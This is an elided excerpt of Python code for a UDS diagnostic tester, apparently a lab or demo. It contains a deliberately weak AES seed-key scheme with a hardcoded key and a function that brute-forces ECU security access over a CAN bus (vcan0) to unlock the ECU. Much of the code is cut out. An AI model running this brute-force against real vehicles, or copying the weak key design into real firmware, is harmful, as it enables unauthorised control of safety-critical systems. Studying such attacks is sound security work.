...
class UDSTester:
    ...
    @staticmethod
    def security_algorithm_weak(seed: bytes) -> bytes:
        """
    ...
    def security_algorithm_weakaes(seed: bytes) -> bytes:
        ...
        """
        WEAK_AES_KEY = bytes.fromhex("00112233445566778899aabbccddeeff")  # example key (attacker knows it)
        if not isinstance(seed, (bytes, bytearray)):
            raise TypeError("seed must be bytes")
        if len(seed) != 16:
...
def brute_force_aes_on_bus(interface="vcan0",
    ...
    def make_key_from_candidate(c):
        b = c.to_bytes(2, "big")    # 2 bytes
        return b * 8                # repeat to 16 bytes
    ...
    try:
        ...
        s.send(seed_request)
        # receive seed response
        #s.settimeout(1.0)
        resp = s.recv()   # raw bytes
        if not resp or len(resp) < 2 or resp[0] != 0x67 or resp[1] != seed_subfunc:
            raise RuntimeError(f"No valid seed response (got: {resp})")
        seed = bytes(resp[2:])
        if len(seed) != 16:
            # allow 16-byte expectation for this demo
            raise RuntimeError(f"Unexpected seed length: {len(seed)}")
        ...
        for cand in range(KEYSPACE_MAX):
            ...
            # check positive response 0x67 key_subfunc
            if r and len(r) >= 2 and r[0] == 0x67 and r[1] == key_subfunc:
                print(f"[BRUTE] Found candidate key id=0x{cand:04x}")
                return key  # return the secret AES key bytes (16)
            if try_sleep:
...
def main():
    ...
    try:
        ...
        # At this point ECU should be unlocked (server returned positive)
    except Exception as e:
